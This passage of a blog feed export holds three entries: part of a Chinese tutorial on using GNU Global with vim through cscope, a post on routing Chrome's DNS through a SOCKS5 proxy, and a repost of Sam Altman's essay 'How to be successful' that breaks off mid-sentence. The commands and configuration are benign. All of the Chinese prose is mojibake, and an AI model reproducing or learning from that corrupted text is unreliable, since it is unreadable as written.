ï¼š/usr/bin/gtags-<span class="hljs-keyword">cscope</span><br><br><span class="hljs-keyword">global</span>-<span class="hljs-number">6.6</span>.<span class="hljs-number">5</span>-<span class="hljs-number">7</span>.fc37.x86_64 : Source code <span class="hljs-keyword">tag</span> <span class="hljs-built_in">system</span><br>ä»“åº“        ï¼šfedora<br>åŒ¹é…æ¥æºï¼š<br>æ–‡ä»¶å    ï¼š/usr/bin/gtags-<span class="hljs-keyword">cscope</span><br></code></pre></td></tr></table></figure><p>macOS ä¸‹å¯ä»¥ä½¿ç”¨ brew å®‰è£… globalï¼Œæ‰§è¡Œ <code>brew install global</code> å³å¯ã€‚<br>å‚è§ <a href="https://www.gnu.org/software/global/download.html">https://www.gnu.org/software/global/download.html</a></p><p>å¦‚æœéœ€è¦gtagsæ”¯æŒ C&#x2F;C++&#x2F;Java ä¹‹å¤–çš„è¯­è¨€ï¼Œéœ€è¦å®‰è£… <code>pygments</code>ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip3 install pygments<br></code></pre></td></tr></table></figure><h2 id="â˜†-3-GNU-global-å’Œ-cscope-vim-é›†æˆ"><a href="#â˜†-3-GNU-global-å’Œ-cscope-vim-é›†æˆ" class="headerlink" title="â˜† 3.  GNU global å’Œ cscope, vim é›†æˆ"></a>â˜† 3.  GNU global å’Œ cscope, vim é›†æˆ</h2><p>vim çš„ cscope æ”¯æŒå¯èƒ½éœ€è¦é‡æ–°ç¼–è¯‘ vimï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŸ¥è¯¢ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim --version | grep cscope<br>+cscope            +localmap          +ruby/dyn          +wildignore<br></code></pre></td></tr></table></figure><p>GNU global æä¾›äº†ä¸¤ä¸ª vim æ’ä»¶ç”¨äºå’Œ vim ç»“åˆï¼Œåˆ†åˆ«ä¸º gtags.vim å’Œ gtags-cscope.vimï¼Œå¯ä»¥ç›´æ¥æ‹·è´åˆ° vim çš„æ’ä»¶ç›®å½•ä½¿ç”¨ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cp</span> /usr/local/share/gtags/gtags.vim <span class="hljs-variable">$HOME</span>/.vim/plugin<br><span class="hljs-built_in">cp</span> /usr/local/share/gtags/gtags-cscope.vim <span class="hljs-variable">$HOME</span>/.vim/plugin<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ç³»ç»Ÿä»“åº“å®‰è£…è·¯å¾„å¯èƒ½æœ‰å˜åŒ–ï¼ŒFedora ä¸Šçš„ gtags.vim è·¯å¾„ä¸º <code>/usr/share/gtags/gtags.vim</code> ã€‚</p><p>gtags-cscope.vim å®šä¹‰äº†ä¸€ç»„å¿«æ·é”®å’Œä»¥å‰çš„ <code>cscope_maps.vim</code> ä¸€è‡´</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sh">:nmap &lt;C-\&gt;s :cs find s &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;g :cs find g &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;c :cs find c &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;t :cs find t &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;e :cs find e &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;f :cs find f &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cfile&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;i :cs find i &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cfile&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br>:nmap &lt;C-\&gt;a :cs find a &lt;C-R&gt;=<span class="hljs-built_in">expand</span>(<span class="hljs-string">&quot;&lt;cword&gt;&quot;</span>)&lt;CR&gt;&lt;CR&gt;<br></code></pre></td></tr></table></figure><p>gtags-cscope.vim çš„ä½¿ç”¨æ³¨é‡Šé‡Œæœ‰è¯¦ç»†çš„è¯´æ˜ï¼š</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot; Usage</span><br><span class="hljs-comment">&quot; -----</span><br><span class="hljs-comment">&quot; First of all, you must execute gtags(1) at the root of source directory</span><br><span class="hljs-comment">&quot; to make tag files. Assuming that your source directory is &#x27;/var/src&#x27;,</span><br><span class="hljs-comment">&quot; it is neccessary to execute the following commands.</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot; [Load vim]</span><br><span class="hljs-comment">&quot;$ cd /var/src</span><br><span class="hljs-comment">&quot;$ gtags</span><br><span class="hljs-comment">&quot;$ vim</span><br><span class="hljs-comment">&quot; [Load gtags-cscope]</span><br><span class="hljs-comment">&quot;:GtagsCscope &lt;ENTER&gt;            (in vim command line)</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot; Basic command</span><br><span class="hljs-comment">&quot; -------------</span><br><span class="hljs-comment">&quot; Then you can use cs commands except for the &#x27;d&#x27;(2) command.</span><br><span class="hljs-comment">&quot; Profitable commands are assigned to keys like follows:</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot;explanationcommand</span><br><span class="hljs-comment">&quot;----------------------------------------------------------</span><br><span class="hljs-comment">&quot;Find symbol:cs find 0 or s</span><br><span class="hljs-comment">&quot;Find definition:cs find 1 or g</span><br><span class="hljs-comment">&quot;Find functions called by this function(not implemented)</span><br><span class="hljs-comment">&quot;Find reference:cs find 3 or c</span><br><span class="hljs-comment">&quot;Find text string:cs find 4 or t</span><br><span class="hljs-comment">&quot;Find egrep pattern:cs find 6 or e</span><br><span class="hljs-comment">&quot;Find path:cs find 7 or f</span><br><span class="hljs-comment">&quot;Find include file:cs find 8 or i</span><br><span class="hljs-comment">&quot;Find assignments:cs find 9 or a</span><br><span class="hljs-comment">&quot;</span><br><span class="hljs-comment">&quot; You can move tag list using:</span><br><span class="hljs-comment">&quot;Go to the next tag :tn</span><br><span class="hljs-comment">&quot;Go to the previous tag :tp</span><br><span class="hljs-comment">&quot;Pop tag stack :pop</span><br></code></pre></td></tr></table></figure><p>é™¤äº†ä¸èƒ½ä½¿ç”¨ <code>:cs find d</code>  å‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨å…¶ä»–æ‰€æœ‰çš„å‘½ä»¤ï¼Œgtags-cscope.vim ä½¿ç”¨å¿«æ·é”®æ›¿ä»£äº†è¾“å…¥å‘½ä»¤ï¼Œå¸¸ç”¨çš„å¿«æ·é”®çš„å«ä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">g</span> - æŸ¥çœ‹å…‰æ ‡ä¸‹ç¬¦å·çš„å®šä¹‰<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">s</span> - æŸ¥çœ‹å…‰æ ‡ä¸‹ç¬¦å·<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">c</span> - æŸ¥çœ‹å…‰æ ‡ä¸‹ç¬¦å·çš„å¼•ç”¨<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">f</span> - æŸ¥æ‰¾å…‰æ ‡ä¸‹çš„æ–‡ä»¶<br><span class="hljs-section">&lt;C-\&gt;</span><span class="hljs-attribute">i</span> - æŸ¥æ‰¾å“ªäº›æ–‡ä»¶ include äº†æœ¬æ–‡ä»¶<br></code></pre></td></tr></table></figure><p><code>&lt;C-\&gt;g</code>  æ˜¯åŒæ—¶æŒ‰ä¸‹ Ctrl å’Œ <code>\</code> ï¼Œæ¥ç€å†æŒ‰ g ï¼Œ å…¶ä»–çš„åŒç†ã€‚</p><p>åœ¨ .vimrc ä¸­æ·»åŠ ä¸‹é¢çš„é…ç½®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> <span class="hljs-title function_">has</span><span class="hljs-params">(<span class="hljs-string">&quot;cscope&quot;</span>)</span><br>&quot; To use the <span class="hljs-keyword">default</span> key/mouse mapping:<br>    let GtagsCscope_Auto_Map = <span class="hljs-number">1</span><br><br><span class="hljs-string">&quot; To deterring interruption:</span><br><span class="hljs-string">    let GtagsCscope_Keep_Alive = 1</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    set cscopetag</span><br><span class="hljs-string">    set csprg=/usr/bin/gtags-cscope</span><br><span class="hljs-string">    set csto=1</span><br><span class="hljs-string">    set nocsverb</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span> Set enviroment values<br>    let $GTAGSLABEL=<span class="hljs-string">&#x27;native-pygments&#x27;</span><br>    let $GTAGSCONF=<span class="hljs-string">&#x27;/etc/gtags.conf&#x27;</span><br><br>endif<br></code></pre></td></tr></table></figure><h2 id="â˜†-4-GUN-global-çš„ä½¿ç”¨æ–¹æ³•"><a href="#â˜†-4-GUN-global-çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="â˜† 4.  GUN global çš„ä½¿ç”¨æ–¹æ³•"></a>â˜† 4.  GUN global çš„ä½¿ç”¨æ–¹æ³•</h2><p>åˆ‡æ¢åˆ°æºç ç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤å°†ç”Ÿæˆ Global æ‰€éœ€è¦çš„ç´¢å¼•æ–‡ä»¶ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*.h&quot;</span> -o -name <span class="hljs-string">&quot;*.hpp&quot;</span> -o -name <span class="hljs-string">&quot;*.hh&quot;</span> -o -name <span class="hljs-string">&quot;*.hxx&quot;</span> -o -name <span class="hljs-string">&quot;*.c&quot;</span> -o -name <span class="hljs-string">&quot;*.cc&quot;</span> -o -name <span class="hljs-string">&quot;*.cpp&quot;</span> -o -name <span class="hljs-string">&quot;*.cxx&quot;</span> &gt; gtags.files<br>gtags -f gtags.files<br></code></pre></td></tr></table></figure><p>ä¸Šé¢çš„å‘½ä»¤æ‰§è¡Œå®Œæ¯•åï¼Œä¼šç”Ÿæˆ GPATHã€GRTAGSã€GTAGS å‡ ä¸ªç´¢å¼•æ–‡ä»¶ã€‚</p><p>åœ¨ vim ä¸­æ‰§è¡Œ <code>:GtagsCscope &lt;ENTER&gt; </code> å³å¯åŠ è½½ç´¢å¼•æ–‡ä»¶ï¼Œæœ€åå°±æ˜¯ä½¿ç”¨å¿«æ·é”®æ„‰å¿«åœ°æµè§ˆæºç æ–‡ä»¶äº†ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://www.gnu.org/software/global/global.html">https://www.gnu.org/software/global/global.html</a></li><li><a href="https://www.gnu.org/software/global/globaldoc_toc.html">https://www.gnu.org/software/global/globaldoc_toc.html</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Chrome æµè§ˆå™¨ä¸­çš„è¿œç¨‹ DNS è§£æ</title>
    <link href="/cn/dns_via_socks_proxy_in_chrome/"/>
    <url>/cn/dns_via_socks_proxy_in_chrome/</url>
    
    <content type="html"><![CDATA[<p>ç”±äºä¼Ÿå¤§çš„Xç«é•¿åŸçš„å­˜åœ¨ï¼Œåœ¨å¢ƒå†…è¿›è¡Œ DNS è§£æè¯·æ±‚è¿”å›çš„æŠ¥æ–‡ä¸ä¸€å®šæ˜¯é è°±çš„ï¼Œæœ‰å¿…è¦ä½¿ç”¨è¿œç¨‹çš„æœåŠ¡å™¨è¿›è¡ŒDNS è§£ææ¥ç¼“è§£è¿™ä¸ªé—®é¢˜ã€‚æ ¹æ® Google çš„æ–‡æ¡£å¦‚æœè®¾ç½®äº† socks5 ä»£ç†ï¼ŒURL ä¸­çš„ hostname å°†ç”±ä»£ç†æœåŠ¡å™¨è§£æã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The <span class="hljs-comment">--proxy-server=&quot;socks5://myproxy:8080&quot; flag tells Chrome to send all http:// and https:// URL requests through the SOCKS proxy server &quot;myproxy:8080&quot;,</span><br><span class="hljs-keyword">using</span> <span class="hljs-built_in">version</span> <span class="hljs-number">5</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> SOCKS protocol. The hostname <span class="hljs-keyword">for</span> these URLs will be resolved <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span>Â proxy server, <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> locally <span class="hljs-keyword">by</span> Chrome.<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ç”±äº chrome æµè§ˆå™¨çš„ DNS prefetching  ç‰¹æ€§ï¼Œå³ä½¿è®¾ç½®äº† socks5 ä»£ç† DNS prefetching ç‰¹æ€§ä¹Ÿä¼šä½¿ç”¨æœ¬åœ°ç½‘ç»œè¿›è¡Œ DNS è§£æã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">The <span class="hljs-comment">--proxy-server flag applies to URL loads only. </span><br>There are other components <span class="hljs-keyword">of</span> Chrome which may issue DNS resolvesÂ directlyÂ <span class="hljs-keyword">and</span> hence bypass this proxy <span class="hljs-keyword">server</span>. <br>The most notable such component <span class="hljs-keyword">is</span> the &quot;DNS prefetcher&quot;. <br>Hence <span class="hljs-keyword">if</span> DNS prefetching <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> disabled <span class="hljs-keyword">in</span> Chrome <span class="hljs-keyword">then</span> you will still see <span class="hljs-keyword">local</span> DNS requests being issued <span class="hljs-keyword">by</span> Chrome despite <span class="hljs-keyword">having</span> specified a SOCKS v5 proxy <span class="hljs-keyword">server</span>.<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ç¦ç”¨ DNS prefetching çš„æ–¹æ³•ï¼Œæ–°ç‰ˆæœ¬çš„ chrome å·²ç»å–æ¶ˆäº†ç›´æ¥é’ˆå¯¹ DNS prefetching è®¾ç½®çš„é€‰é¡¹ï¼Œæœ‰ä¸€ä¸ªé¢„åŠ è½½ç½‘é¡µçš„é€‰é¡¹ï¼Œéœ€è¦æŠŠè¿™ä¸ªé€‰é¡¹å…³é—­ï¼Œå…·ä½“è®¾ç½®æ–¹æ³•ä¸ºï¼š</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">è®¾ç½® -&gt; éšç§è®¾ç½®å’Œå®‰å…¨æ€§ -&gt; Cookie åŠå…¶ä»–ç½‘ç«™æ•°æ® -&gt; é¢„åŠ è½½ç½‘é¡µï¼Œä»¥ä¾¿å®ç°æ›´å¿«é€Ÿçš„æµè§ˆå’Œæœç´¢<br></code></pre></td></tr></table></figure><p>ç¦ç”¨ DNS prefetching çš„æ–¹æ¡ˆæ˜¯è„†å¼±çš„ï¼ŒChrome å¯èƒ½åœ¨å…¶ä»–çš„åœ°æ–¹ä½¿ç”¨ raw dns requsts ï¼ˆ Chrome å‘é€ DNS è¯·æ±‚æŠ¥æ–‡)ï¼Œ ç»•è¿‡ä»£ç†æœåŠ¡å™¨ç›´æ¥ä½¿ç”¨æœ¬åœ°ç½‘ç»œè¿›è¡Œ DNS è§£æã€‚</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Disabling DNS prefetching would solve this problem, <br>however <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> a fragile solution <span class="hljs-keyword">since</span> once needs <span class="hljs-keyword">to</span> be aware <span class="hljs-keyword">of</span> all <span class="hljs-keyword">the</span> areas <span class="hljs-keyword">in</span> Chrome which issue raw DNS requests.<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨ Google æ–‡æ¡£ä¸­çš„å‘½ä»¤è¡Œå‚æ•° <code>--host-resolver-rules=</code> ï¼Œç»è¿‡æµ‹è¯•å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤è¡Œæ¥è§£å†³ DNS è¿œç¨‹è§£æ</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">google-chrome --proxy-server<span class="hljs-operator">=</span><span class="hljs-string">&quot;socks5://127.0.0.1:9999&quot;</span> --host-resolver-rules<span class="hljs-operator">=</span><span class="hljs-string">&quot;MAP * 0.0.0.0, EXClUDE 127.0.0.1&quot;</span><br></code></pre></td></tr></table></figure><p>â€“host-resolver-rules å°†é˜»æ­¢Chrome ä½¿ç”¨æœ¬åœ°ç½‘ç»œå‘èµ· DNS è¯·æ±‚ï¼Œå…·ä½“çš„æ–¹å¼æ˜¯å°† DNS è¯·æ±‚è½¬å‘ä¸€ä¸ªä¸å­˜åœ¨çš„åœ°å€ï¼Œæ³¨æ„éœ€è¦æ’é™¤ sock5 ä»£ç†çš„åœ°å€ã€‚</p><p>åœ¨å®é™…ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°ï¼Œå¦‚æœä¸æŒ‡å®š â€“host-resolver-rules å‘½ä»¤è¡Œå‚æ•°ï¼Œæœ‰å°‘é‡ DNS è¯·æ±‚ä¼šä½¿ç”¨æœ¬åœ°ç½‘ç»œï¼Œæ¯”å¦‚ safebrowsing.googleapis.com</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://www.chromium.org/developers/design-documents/network-stack/socks-proxy/">https://www.chromium.org/developers/design-documents/network-stack/socks-proxy/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>How to be successful</title>
    <link href="/cn/How%20to%20be%20successful/"/>
    <url>/cn/How%20to%20be%20successful/</url>
    
    <content type="html"><![CDATA[<p>source: <a href="https://blog.samaltman.com/how-to-be-successful">https://blog.samaltman.com/how-to-be-successful</a></p><p>Iâ€™ve observed thousands of founders and thought a lot about what it takes to make a huge amount of money or to create something important. Usually, people start off wanting the former and end up wanting the latter.</p><p>Here are 13 thoughts about how to achieve such outlier success. Everything here is easier to do once youâ€™ve already reached a baseline degree of success (through privilege or effort) and want to put in the work to turn that into outlier success. [1] But much of it applies to anyone.</p><h2 id="1-Compound-yourself"><a href="#1-Compound-yourself" class="headerlink" title="1. Compound yourself"></a>1. Compound yourself</h2><p>Compounding is magic. Look for it everywhere. Exponential curves are the key to wealth generation.</p><p>A medium-sized business that grows 50% in value every year becomes huge in a very short amount of time. Few businesses in the world have true network effects and extreme scalability. But with technology, more and more will.  Itâ€™s worth a lot of effort to find them and create them.</p><p>You also want to be an exponential curve yourselfâ€”you should aim for your life to follow an ever-increasing up-and-to-the-right trajectory. Itâ€™s important to move towards a career that has a compounding effectâ€”most careers progress fairly linearly.</p><p>You donâ€™t want to be in a career where people who have been doing it for two years can be as effective as people who have been doing it for twentyâ€”your rate of learning should always be high. As your career progresses, each unit of work you do should generate more and more results. There are many ways to get this leverage, such as capital, technology, brand, network effects, and managing people.</p><p>Itâ€™s useful to focus on adding another zero to whatever you define as your success metricâ€”money, status, impact on the world, or whatever. I am willing to take as much time as needed between projects to find my next thing. But I always want it to be a project that, if successful, will make the rest of my career look like a footnote.</p><p>Most people get bogged down in linear opportunities. Be willing to let small opportunities go to focus on potential step changes.</p><p>I think the biggest competitive advantage in businessâ€”either for a company or for an individualâ€™s careerâ€”is long-term thinking with a broad view of how different systems in the world are going to come together. One of the notable aspects of compound growth is that the furthest out years are the most important. In a world where almost no one takes a truly long-term view, the market richly rewards those who do.</p><p>Trust the exponential, be patient, and be pleasantly surprised.</p><h2 id="2-Have-almost-too-much-self-belief"><a href="#2-Have-almost-too-much-self-belief" class="headerlink" title="2. Have almost too much self-belief"></a>2. Have almost too much self-belief</h2><p>Self-belief is immensely powerful. The most successful people I know believe in themselves almost to the point of delusion.</p><p>Cultivate this early. As you get more data points that your judgment is good and you can consistently deliver results, trust yourself more.</p><p>If you donâ€™t believe in yourself, itâ€™s hard to let yourself have contrarian ideas about the future. But this is where most value gets created.</p><p>I remember when Elon Musk took me on a tour of the SpaceX factory many years ago. He talked in detail about manufacturing every part of the rocket, but the thing that sticks in memory was the look of absolute certainty on his face when he talked about sending large rockets to Mars. I left thinking â€œhuh, so thatâ€™s the benchmark for what conviction looks like.â€</p><p>Managing your own moraleâ€”and your teamâ€™s moraleâ€”is one of the greatest challenges of most endeavors. Itâ€™s almost impossible without a lot of self-belief. And unfortunately, the more ambitious you are, the more the world will try to tear you down.  </p><p>Most highly successful people have been really right about the future at least once at a time when people thought they were wrong. If not, they would have faced much more competition.</p><p>Self-belief must be balanced with self-awareness. I used to hate criticism of any sort and actively avoided it. Now I try to always listen to it with the assumption that itâ€™s true, and then decide if I want to act on it or not. Truth-seeking is hard and often painful, but it is what separates self-belief from self-delusion.</p><p>This balance also helps you avoid coming across as entitled and out of touch.</p><h2 id="3-Learn-to-think-independently"><a href="#3-Learn-to-think-independently" class="headerlink" title="3. Learn to think independently"></a>3. Learn to think independently</h2><p>Entrepreneurship is very difficult to teach because original thinking is very difficult to teach. School is not set up to teach thisâ€”in fact, it generally rewards the opposite. So you have to cultivate it on your own.</p><p>Thinking from first principles and trying to generate new ideas is fun, and finding people to exchange them with is a great way to get better at this. The next step is to find easy, fast ways to test these ideas in the real world.</p><p>â€œI will fail many times, and I will be really right onceâ€ is the entrepreneursâ€™ way. You have to give yourself a lot of chances to get lucky.</p><p>One of the most powerful lessons to learn is that you can figure out what to do in situations that seem to have no solution. The more times you do this, the more you will believe it. Grit comes from learning you can get back up after you get knocked down.</p><h2 id="4-Get-good-at-â€œsalesâ€"><a href="#4-Get-good-at-â€œsalesâ€" class="headerlink" title="4. Get good at â€œsalesâ€"></a>4. Get good at â€œsalesâ€</h2><p>Self-belief alone is not sufficientâ€”you also have to be able to convince other people of what you believe.</p><p>All great careers, to some degree, become sales jobs. You have to evangelize your plans to customers, prospective employees, the press, investors, etc. This requires an inspiring vision, strong communication skills, some degree of charisma, and evidence of execution ability.</p><p>Getting good at communicationâ€”particularly written communicationâ€”is an investment worth making. My best advice for communicating clearly is to first make sure your thinking is clear and then use plain, concise language.</p><p>The best way to be good at sales is to genuinely believe in what youâ€™re selling. Selling what you truly believe in feels great, and trying to sell snake oil feels awful.</p><p>Getting good at sales is like improving at any other skillâ€”anyone can get better at it with deliberate practice. But for some reason, perhaps because it feels distasteful, many people treat it as something unlearnable.</p><p>My other big sales tip is to show up in person whenever itâ€™s important. When I was first starting out, I was always willing to get on a plane. It was frequently unnecessary, but three times it led to career-making turning points for me that otherwise would have gone the other way.</p><h2 id="5-Make-it-easy-to-take-risks"><a href="#5-Make-it-easy-to-take-risks" class="headerlink" title="5. Make it easy to take risks"></a>5. Make it easy to take risks</h2><p>Most people overestimate risk and underestimate reward. Taking risks is important because itâ€™s impossible to be right all the timeâ€”you have to try many things and adapt quickly as you learn more.</p><p>Itâ€™s often easier to take risks early in your career; you donâ€™t have much to lose, and you potentially have a lot to gain. Once youâ€™ve gotten yourself to a point where you have your basic obligations covered you should try to make it easy to take risks. Look for small bets you can make where you lose 1x if youâ€™re wrong but make 100x if it works. Then make a bigger bet in that direction.</p><p>Donâ€™t save up for too long, though. At YC, weâ€™ve often noticed a problem with founders that have spent a lot of time working at Google or Facebook. When people get used to a comfortable life, a predictable job, and a reputation of succeeding at whatever they do, it gets very hard to leave that behind (and people have an incredible ability to always match their lifestyle to next yearâ€™s salary). Even if they do leave, the temptation to return is great. Itâ€™s easyâ€”and human natureâ€”to prioritize short-term gain and convenience over long-term fulfillment.  </p><p>But when you arenâ€™t on the treadmill, you can follow your hunches and spend time on things that might turn out to be really interesting. Keeping your life cheap and flexible for as long as you can is a powerful way to do this, but obviously comes with tradeoffs.</p><h2 id="6-Focus"><a href="#6-Focus" class="headerlink" title="6. Focus"></a>6. Focus</h2><p>Focus is a force multiplier on work.</p><p>Almost everyone Iâ€™ve ever met would be well-served by spending more time thinking about what to focus on. It is much more important to work on the right thing than it is to work many hours. Most people waste most of their time on stuff that doesnâ€™t matter.</p><p>Once you have figured out what to do, be unstoppable about getting your small handful of priorities accomplished quickly. I have yet to meet a slow-moving person who is very successful.</p><h2 id="7-Work-hard"><a href="#7-Work-hard" class="headerlink" title="7. Work hard"></a>7. Work hard</h2><p>You can get to about the 90th percentile in your field by working either smart or hard, which is still a great accomplishment. But getting to the 99th percentile requires bothâ€”you will be competing with other very talented people who will have great ideas and be willing to work a lot.</p><p>Extreme people get extreme results. Working a lot comes with huge life trade-offs, and itâ€™s perfectly rational to decide not to do it. But it has a lot of advantages. As in most cases, momentum compounds, and success begets success.</p><p>And itâ€™s often really fun. One of the great joys in life is finding your purpose, excelling at it, and discovering that your impact matters to something larger than yourself. A YC founder recently expressed great surprise about how much happier and more fulfilled he was after leaving his job at a big company and working towards his maximum possible impact. Working hard at that should be celebrated.  </p><p>Itâ€™s not entirely clear to me why working hard has become a Bad Thing in certain parts of the US, but this is certainly not the case in other parts of the worldâ€”the amount of energy and drive exhibited by entrepreneurs outside of the US is quickly becoming the new benchmark.</p><p>You have to figure out how to work hard without burning out. People find their own strategies for this, but one that almost always works is to find work you like doing with people you enjoy spending a lot of time with.</p><p>I think people who pretend you can be super successful professionally without working most of the time (for some period of your life) are doing a disservice. In fact, work stamina seems to be one of the biggest predictors of long-term success.</p><p>One more thought about working hard: do it at the beginning of your career. Hard work compounds like interest, and the earlier you do it, the more time you have for the benefits to pay off. Itâ€™s also easier to work hard when you have fewer other responsibilities, which is frequently but not always the case when youâ€™re young.</p><h2 id="8-Be-bold"><a href="#8-Be-bold" class="headerlink" title="8. Be bold"></a>8. Be bold</h2><p>I believe that itâ€™s easier to do a hard startup than an easy startup. People want to be part of something exciting and feel that their work matters.</p><p>If you are making progress on an important problem, you will have a constant tailwind of people wanting to help you. Let yourself grow more ambitious, and donâ€™t be afraid to work on what you really want to work on.</p><p>If everyone else is starting meme companies, and you want to start a gene-editing company, then do that and donâ€™t second guess it.</p><p>Follow your curiosity. Things that seem exciting to you will often seem exciting to other people too.</p><h2 id="9-Be-willful"><a href="#9-Be-willful" class="headerlink" title="9. Be willful"></a>9. Be willful</h2><p>A big secret is that you can bend the world to your will a surprising percentage of the timeâ€”most people donâ€™t even try, and just accept that things are the way that they are.</p><p>People have an enormous capacity to make things happen. A combination of self-doubt, giving up too early, and not pushing hard enough prevents most people from ever reaching anywhere near their 